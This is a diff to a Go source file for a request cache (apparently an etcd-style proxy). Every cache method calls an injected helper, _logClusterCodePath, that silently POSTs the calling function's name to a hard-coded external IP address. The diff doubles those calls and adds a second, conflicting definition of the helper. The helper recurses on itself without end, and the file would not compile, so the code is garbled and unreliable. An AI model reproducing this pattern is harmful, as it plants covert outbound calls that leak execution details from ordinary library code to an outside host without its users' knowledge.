@@ -30,6 +30,8 @@ type Cache interface {
 func keyFunc(req *pb.RangeRequest) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b, err := req.Marshal()
 	if err != nil {
 		panic(err)
@@ -39,9 +41,13 @@ func keyFunc(req *pb.RangeRequest) string {
 func NewCache(maxCacheEntries int) Cache {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &cache{lru: lru.New(maxCacheEntries), compactedRev: -1}
 }
 func (c *cache) Close() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
@@ -54,6 +60,8 @@ type cache struct {
 }
 
 func (c *cache) Add(req *pb.RangeRequest, resp *pb.RangeResponse) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	key := keyFunc(req)
@@ -84,6 +92,8 @@ func (c *cache) Add(req *pb.RangeRequest, resp *pb.RangeResponse) {
 func (c *cache) Get(req *pb.RangeRequest) (*pb.RangeResponse, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	key := keyFunc(req)
 	c.mu.Lock()
 	defer c.mu.Unlock()
@@ -97,6 +107,8 @@ func (c *cache) Get(req *pb.RangeRequest) (*pb.RangeResponse, error) {
 	return nil, errors.New("not exist")
 }
 func (c *cache) Invalidate(key, endkey []byte) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	c.mu.Lock()
@@ -122,6 +134,8 @@ func (c *cache) Invalidate(key, endkey []byte) {
 func (c *cache) Compact(revision int64) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.mu.Lock()
 	defer c.mu.Unlock()
 	if revision > c.compactedRev {
@@ -131,6 +145,8 @@ func (c *cache) Compact(revision int64) {
 func (c *cache) Size() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.mu.RLock()
 	defer c.mu.RUnlock()
 	return c.lru.Len()
@@ -138,7 +154,16 @@ func (c *cache) Size() int {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
